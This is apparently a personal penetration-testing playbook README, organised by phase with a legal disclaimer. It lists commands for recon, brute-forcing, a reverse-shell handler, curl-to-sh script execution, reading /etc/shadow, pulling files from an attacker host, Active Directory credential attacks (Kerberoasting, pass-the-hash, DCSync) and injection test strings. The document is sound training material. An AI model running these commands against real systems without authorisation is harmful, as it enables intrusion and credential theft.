# 🗡️ 0xdolus-playbook

> A personal penetration testing methodology and reference guide by [0xdolus](https://github.com/0xdolus).  
> Built from real CTF experience, eJPT certification training, and continuous home lab practice.  
> This is a living document — updated as I learn and grow.

---

## ⚠️ Legal Disclaimer

This guide is for **educational purposes only**.  
Only perform penetration testing on systems you **own** or have **explicit written permission** to test.  
Unauthorized testing is illegal. Always practice on legal platforms:
- [TryHackMe](https://tryhackme.com)
- [HackTheBox](https://hackthebox.com)
- [VulnHub](https://vulnhub.com)

---

## 📋 Table of Contents

1. [Methodology Overview](#methodology-overview)
2. [Phase 1 — Reconnaissance](#phase-1--reconnaissance)
3. [Phase 2 — Scanning & Enumeration](#phase-2--scanning--enumeration)
4. [Phase 3 — Exploitation](#phase-3--exploitation)
5. [Phase 4 — Post Exploitation](#phase-4--post-exploitation)
6. [Phase 5 — Active Directory Attacks](#phase-5--active-directory-attacks)
7. [Phase 6 — Web Application Testing](#phase-6--web-application-testing)
8. [Phase 7 — Reporting](#phase-7--reporting)
9. [Tools Index](#tools-index)

---

## Methodology Overview

```
┌─────────────────────────────────────────────────────┐
│              PENETRATION TESTING PHASES              │
├─────────────────────────────────────────────────────┤
│  1. RECONNAISSANCE   →  Gather information           │
│  2. SCANNING         →  Find open doors              │
│  3. EXPLOITATION     →  Get inside                   │
│  4. POST EXPLOIT     →  Escalate & persist           │
│  5. AD ATTACKS       →  Own the domain               │
│  6. WEB APP          →  Break web targets            │
│  7. REPORTING        →  Document everything          │
└─────────────────────────────────────────────────────┘
```

---

## Phase 1 — Reconnaissance

> Goal: Gather as much information as possible before touching the target.

### Passive Recon (No direct contact with target)

```bash
# WHOIS lookup
whois target.com

# DNS enumeration
nslookup target.com
dig target.com ANY

# Find subdomains
sublist3r -d target.com

# Google dorking examples
site:target.com
intitle:"index of" site:target.com
filetype:pdf site:target.com
```

### Active Recon (Direct contact with target)

```bash
# Host discovery — find live hosts
nmap -sn 192.168.1.0/24
netdiscover -r 192.168.1.0/24

# Quick automated recon
nmapAutomator.sh -H <target-ip> -t Network
```

**Tools used:**
| Tool | Purpose | Repo |
|------|---------|------|
| Nmap | Network scanning | [nmap/nmap](https://github.com/nmap/nmap) |
| nmapAutomator | Automated recon | [21y4d/nmapAutomator](https://github.com/21y4d/nmapAutomator) — [my fork](https://github.com/0xdolus/nmapAutomator) |
| Netdiscover | ARP host discovery | Built into Kali/AntiX |
| Sublist3r | Subdomain enumeration | [aboul3la/Sublist3r](https://github.com/aboul3la/Sublist3r) |

---

## Phase 2 — Scanning & Enumeration

> Goal: Find open ports, running services, versions, and potential vulnerabilities.

### Port Scanning

```bash
# Initial fast scan
nmap -sC -sV -oN initial.txt <target-ip>

# Full port scan
nmap -p- --min-rate=1000 -T4 <target-ip>

# Automated full scan
nmapAutomator.sh -H <target-ip> -t Full
```

### Service Enumeration

```bash
# Web server enumeration
nikto -h http://<target-ip>

# Directory brute force
gobuster dir -u http://<target-ip> -w /usr/share/wordlists/dirb/common.txt

# SMB enumeration
enum4linux -a <target-ip>
nmap --script=smb-enum-shares <target-ip>

# FTP check
nmap --script=ftp-anon <target-ip>

# SSH version
nmap -p 22 -sV <target-ip>
```

### Common Ports Cheatsheet

| Port | Service | What to check |
|------|---------|---------------|
| 21 | FTP | Anonymous login, version exploits |
| 22 | SSH | Version, weak credentials |
| 23 | Telnet | Default credentials |
| 25 | SMTP | User enumeration |
| 80/443 | HTTP/S | Web app vulnerabilities |
| 139/445 | SMB | Shares, EternalBlue |
| 3306 | MySQL | Default credentials |
| 3389 | RDP | Brute force, BlueKeep |
| 5985 | WinRM | Evil-WinRM access |

**Tools used:**
| Tool | Purpose | Repo |
|------|---------|------|
| Nmap | Port & service scan | [nmap/nmap](https://github.com/nmap/nmap) — [my notes](https://github.com/0xdolus/nmap-notes) |
| Gobuster | Directory brute force | [OJ/gobuster](https://github.com/OJ/gobuster) — [my fork](https://github.com/0xdolus/gobuster) |
| Nikto | Web vuln scanner | [sullo/nikto](https://github.com/sullo/nikto) — [my fork](https://github.com/0xdolus/nikto) |
| nmapAutomator | Automated scanning | [21y4d/nmapAutomator](https://github.com/21y4d/nmapAutomator) — [my fork](https://github.com/0xdolus/nmapAutomator) |

---

## Phase 3 — Exploitation

> Goal: Use discovered vulnerabilities to gain initial access.

### Metasploit Framework

```bash
# Start Metasploit
msfconsole

# Search for an exploit
search <service/CVE>

# Use an exploit
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <your-ip>
set LPORT 4444
run
```

### Manual Exploitation

```bash
# Search for public exploits
searchsploit <service> <version>

# Copy exploit to working directory
searchsploit -m <exploit-id>
```

### Password Attacks

```bash
# Crack a hash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt

# Identify hash type
hash-identifier

# Brute force SSH
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://<target-ip>

# Brute force web login
hydra -l admin -P /usr/share/wordlists/rockyou.txt <target-ip> http-post-form "/login:username=^USER^&password=^PASS^:Invalid"
```

**Tools used:**
| Tool | Purpose | Repo |
|------|---------|------|
| Metasploit | Exploitation framework | [rapid7/metasploit-framework](https://github.com/rapid7/metasploit-framework) — [my fork](https://github.com/0xdolus/metasploit-framework) |
| John the Ripper | Password cracking | [openwall/john](https://github.com/openwall/john) |
| Hashcat | GPU hash cracking | [hashcat/hashcat](https://github.com/hashcat/hashcat) |
| Hydra | Brute forcing | [vanhauser-thc/thc-hydra](https://github.com/vanhauser-thc/thc-hydra) — [my fork](https://github.com/0xdolus/thc-hydra) |

---

## Phase 4 — Post Exploitation

> Goal: Escalate privileges, maintain access, and move laterally.

### Linux Privilege Escalation

```bash
# Run LinPEAS (automated priv esc check)
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Manual checks
whoami
id
sudo -l                          # What can we run as sudo?
find / -perm -4000 2>/dev/null   # SUID binaries
crontab -l                       # Cron jobs
cat /etc/passwd
cat /etc/shadow
```

### Windows Privilege Escalation

```bash
# Run WinPEAS
.\winPEAS.exe

# Manual checks
whoami /priv
net localgroup administrators
systeminfo
```

### Transferring Files

```bash
# Python HTTP server (on attacker)
python3 -m http.server 8080

# Download on target (Linux)
wget http://<attacker-ip>:8080/file.sh
curl http://<attacker-ip>:8080/file.sh -o file.sh

# Download on target (Windows)
certutil -urlcache -split -f http://<attacker-ip>:8080/file.exe file.exe
```

**Tools used:**
| Tool | Purpose | Repo |
|------|---------|------|
| LinPEAS/WinPEAS | Privilege escalation | [carlospolop/PEASS-ng](https://github.com/carlospolop/PEASS-ng) — [my fork](https://github.com/0xdolus/PEASS-ng) |

---

## Phase 5 — Active Directory Attacks

> Goal: Enumerate AD, escalate to Domain Admin.

### Enumeration

```bash
# BloodHound data collection
bloodhound-python -u <user> -p <pass> -d <domain> -ns <dc-ip> -c all

# SMB enumeration
crackmapexec smb <target-ip> -u <user> -p <pass> --shares

# LDAP enumeration
ldapsearch -x -H ldap://<dc-ip> -b "DC=domain,DC=local"
```

### Common AD Attacks

```bash
# AS-REP Roasting (no pre-auth required)
impacket-GetNPUsers domain/ -usersfile users.txt -dc-ip <dc-ip>

# Kerberoasting
impacket-GetUserSPNs domain/user:pass -dc-ip <dc-ip> -request

# Pass the Hash
crackmapexec smb <target-ip> -u Administrator -H <NTLM-hash>

# DCSync
secretsdump.py domain/user:pass@<dc-ip>
```

**Tools used:**
| Tool | Purpose | Repo |
|------|---------|------|
| BloodHound | AD attack path mapping | [BloodHoundAD/BloodHound](https://github.com/BloodHoundAD/BloodHound) — [my fork](https://github.com/0xdolus/BloodHound) |
| CrackMapExec | AD enumeration & attacks | [byt3bl33d3r/CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) — [my fork](https://github.com/0xdolus/CrackMapExec) |
| Impacket | AD protocol attacks | [SecureAuthCorp/impacket](https://github.com/SecureAuthCorp/impacket) — [my fork](https://github.com/0xdolus/impacket) |

---

## Phase 6 — Web Application Testing

> Goal: Find and exploit web vulnerabilities — SQLi, XSS, LFI, RFI, SSRF, etc.

### Reconnaissance

```bash
# Technology fingerprinting
whatweb http://<target>

# Directory discovery
gobuster dir -u http://<target> -w /usr/share/wordlists/dirb/common.txt -x php,html,txt

# Parameter fuzzing
ffuf -u http://<target>/page?FUZZ=test -w wordlist.txt
```

### SQL Injection

```bash
# Automated SQLi
sqlmap -u "http://<target>/page?id=1" --dbs
sqlmap -u "http://<target>/page?id=1" -D <database> --tables
sqlmap -u "http://<target>/page?id=1" -D <database> -T <table> --dump
```

### Common Web Vulnerabilities

```bash
# LFI test
http://<target>/page?file=../../../../etc/passwd

# XSS test
<script>alert(1)</script>

# Command injection test
; whoami
| whoami
`whoami`
```

### Burp Suite Workflow

1. Set browser proxy to `127.0.0.1:8080`
2. Intercept requests
3. Send to Repeater for manual testing
4. Send to Intruder for fuzzing
5. Use Scanner for automated checks

**Tools used:**
| Tool | Purpose | Repo |
|------|---------|------|
| SQLmap | SQL injection | [sqlmapproject/sqlmap](https://github.com/sqlmapproject/sqlmap) — [my fork](https://github.com/0xdolus/sqlmap) |
| PayloadsAllTheThings | Payload reference | [swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) — [my fork](https://github.com/0xdolus/PayloadsAllTheThings) |
| Gobuster | Directory fuzzing | [OJ/gobuster](https://github.com/OJ/gobuster) — [my fork](https://github.com/0xdolus/gobuster) |
| Nikto | Web scanner | [sullo/nikto](https://github.com/sullo/nikto) — [my fork](https://github.com/0xdolus/nikto) |

---

## Phase 7 — Reporting

> A pentest is only as good as its report.

### Report Structure

```
1. Executive Summary
   - Scope, dates, findings summary

2. Methodology
   - Tools and techniques used

3. Findings
   - Vulnerability name
   - Severity (Critical/High/Medium/Low)
   - Description
   - Evidence (screenshots, commands)
   - Remediation

4. Appendix
   - Raw tool output
   - Full command list
```

### Always Save Your Output

```bash
# Nmap output
nmap -oA scan_results <target>

# Keep a notes file per machine
mkdir <machine-name>
cd <machine-name>
touch notes.md
```

---

## Tools Index

| Tool | Phase | Language | My Fork |
|------|-------|----------|---------|
| Nmap | Recon/Scan | C | [notes](https://github.com/0xdolus/nmap-notes) |
| nmapAutomator | Recon/Scan | Shell | [fork](https://github.com/0xdolus/nmapAutomator) |
| Gobuster | Enumeration | Go | [fork](https://github.com/0xdolus/gobuster) |
| Nikto | Enumeration | Perl | [fork](https://github.com/0xdolus/nikto) |
| Metasploit | Exploitation | Ruby | [fork](https://github.com/0xdolus/metasploit-framework) |
| SQLmap | Exploitation | Python | [fork](https://github.com/0xdolus/sqlmap) |
| Hydra | Exploitation | C | [fork](https://github.com/0xdolus/thc-hydra) |
| LinPEAS/WinPEAS | Post Exploit | Shell/C# | [fork](https://github.com/0xdolus/PEASS-ng) |
| BloodHound | AD Attacks | JavaScript | [fork](https://github.com/0xdolus/BloodHound) |
| CrackMapExec | AD Attacks | Python | [fork](https://github.com/0xdolus/CrackMapExec) |
| Impacket | AD Attacks | Python | [fork](https://github.com/0xdolus/impacket) |
| PayloadsAllTheThings | Web App | Python | [fork](https://github.com/0xdolus/PayloadsAllTheThings) |

---

## 📚 Resources I Use

- [HackTricks](https://book.hacktricks.xyz) — pentesting bible
- [GTFOBins](https://gtfobins.github.io) — Linux privilege escalation
- [LOLBAS](https://lolbas-project.github.io) — Windows living off the land
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) — payload reference
- [RevShells](https://www.revshells.com) — reverse shell generator

---

## 🏴 CTF Writeups

Documenting my CTF solutions separately:
> 📁 [0xdolus/ctf-writeups](https://github.com/0xdolus/ctf-writeups) *(coming soon)*

---

<div align="center">

*Built with 🔥 by [0xdolus](https://github.com/0xdolus) | eJPT Certified*  
*"Hack the planet — legally."*

</div>
